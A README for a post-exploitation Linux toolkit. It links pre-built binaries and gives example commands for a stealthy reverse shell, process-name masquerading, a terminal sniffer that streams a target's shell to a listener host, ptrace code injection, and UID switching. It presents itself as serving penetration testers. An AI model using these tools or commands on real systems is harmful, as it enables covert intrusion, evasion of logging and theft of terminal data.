# PELT #

***
**What is PELT?**

_PELT_ is the Post Exploitation Linux Toolkit. It is intended as a collection of Linux user space tools designed to assist pentesters during the post-exploitation phases of their engagement. The tools appear here as pre-built binaries for easy access in the field.

These tools are each projects of mine with their own Github pages. Please refer to these project pages for full descriptions as well as source code.

***
### _revsh_ ###

_revsh_ is a reverse shell. It was designed to meet the needs of pentesters facing long engagements. The features include:

 * Full terminal support.
 * Unicode support.
 * Circumvention of the login record. (utmp / wtmp)
 * rc file support for launching recurring / cutomized commands upon login.
 * OpenSSL encryption with key based authentication baked into the binary.
 * Anonymous Diffie-Hellman encryption upon request.
 * Ephemeral Diffie-Hellman encryption as default.
 * Cert pinning for protection against sinkholes and mitm counter-intrusion.
 * Connection timeout for remote process self-termination.
 * Randomized retry timers for non-predictable auto-reconnection.
 * Netcat style non-interactive data brokering for file transfer.

Project page: [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)

Pre-built binaries: [x86_64-Linux](https://github.com/emptymonkey/PELT/raw/master/revsh/revsh-x86_64-Linux), [i686-Linux](https://github.com/emptymonkey/PELT/raw/master/revsh/revsh-i686-Linux), [amd64-FreeBSD](https://github.com/emptymonkey/PELT/raw/master/revsh/revsh-amd64-FreeBSD)

Tarball of the keys / certs used with these binaries: [keys.tar](https://github.com/emptymonkey/PELT/raw/master/revsh/keys.tar) 

Example:

	empty@monkey:~$ ./revsh -c 

	user@target:~$ ./revsh

Note: The pre-built binaries here use the default keys provided. If you are using this anywhere sensitive, you are strongly encouraged to download the source and build your own copy. This will generate unique keys / certs. As always, your mission is only as secure as your key management process.


***
### _mimic_ ###

_mimic_ is a tool that allows a user to run a program, but have it show up in the process table as something different. The name in the process listing can be any string. _mimic_ does **not** require root privileges.

Project page:	[https://github.com/emptymonkey/mimic](https://github.com/emptymonkey/mimic)

Pre-built binaries: [x86_64-Linux](https://github.com/emptymonkey/PELT/raw/master/mimic)

Example:

	empty@monkey:~$ ./mimic -e "/bin/bash" -m "/sbin/getty 38400 tty0"

***
### _set_target_pid_ ###

_set_target_pid_ is a simple program that resets the Process ID (PID) numbers being issued by the system as close as possible to a target. This program is part of the _mimic_ project. This program does **not** require root privileges.

Project page:	[https://github.com/emptymonkey/mimic](https://github.com/emptymonkey/mimic)

Pre-built binaries: [x86_64-Linux](https://github.com/emptymonkey/PELT/raw/master/set_target_pid)

Example:

	empty@monkey:~$ ./set_target_pid 1

Note: The target PID is only a target. _set_target_pid_ will try to get as close as possible, but that PID may simply not be available. The PIDs smaller than 300 appear to be reserved for kernel threads. If you request a PID of '1', then look for the result around '300'. Finally, after you set the PIDs and launched your payload, don't forget to reset the PIDs again to where they were before.

***
### _shelljack_ ###

_shelljack_ is terminal sniffer. (This is similar to a keystroke logger, but it gathers all input **and** output.) _shelljack_ does **not** require root privileges (except on Ubuntu systems).

Project page:	[https://github.com/emptymonkey/shelljack](https://github.com/emptymonkey/shelljack)

Pre-built binaries: [x86_64-Linux](https://github.com/emptymonkey/PELT/raw/master/shelljack)

Example:

	empty@monkey:~$ ncat -l 192.168.1.42 9999

	user@target:~$ ./shelljack 192.168.1.42:9999 $$

Note: _shelljack_ uses ptrace() to attach to processes. Because Ubuntu is patched specifically against this type of attack, _shelljack_ won't work on Ubuntu systems unless it is run as root. 

***
### _sigsleeper_ ###

_sigsleeper_ injects malicious code into a process that can be triggered by sending that process a signal. This type of attack is best describes as a "malicious signal handler injection with ptrace" attack. Because the injected code will sit quietly until it receives it's signal, at which point it will then launch its payload, I refer to this as "sleeper code". _sigsleeper_ does **not** require root privileges (except on Ubuntu systems).

Project page: [https://github.com/emptymonkey/sigsleeper](https://github.com/emptymonkey/sigsleeper)

Pre-built binaries: [x86_64-Linux](https://github.com/emptymonkey/PELT/raw/master/sigsleeper)

Example:

	empty@monkey:~$ sigsleeper -f -e '/bin/echo Hello world!' $$
	empty@monkey:~$ kill -USR1 $$
	empty@monkey:~$ Hello world!

Note: _sigsleeper_ uses ptrace() to attach to processes. Because Ubuntu is patched specifically against this type of attack, _sigsleeper_ won't work on Ubuntu systems unless it is run as root.

***
### _pretend_ ###

_pretend_ is a very simple program that changes your UID / GIDs. _pretend_ **does** require root privileges. This program is useful for programmatically changing your UID on the fly without requiring that the UID maps to a valid account on the host. There are a class of attacks for which this tool is very nice to have available.

Project page: [https://github.com/emptymonkey/pretend](https://github.com/emptymonkey/pretend)

Pre-built binaries: [x86_64](https://github.com/emptymonkey/PELT/raw/master/pretend)

Example: 

	empty@monkey:~$ sudo pretend 5:26:103:110:50 id
	uid=5(games) gid=26(tape) groups=60(games),50(staff),103(ssh),110(kvm)


***
### A Quick Note on Ethics ###

I write and release these tools with the intention of educating the larger [IT](http://en.wikipedia.org/wiki/Information_technology) community and empowering legitimate pentesters. If I can write these tools in my spare time, then rest assured that the dedicated malicious actors have already developed versions of their own.

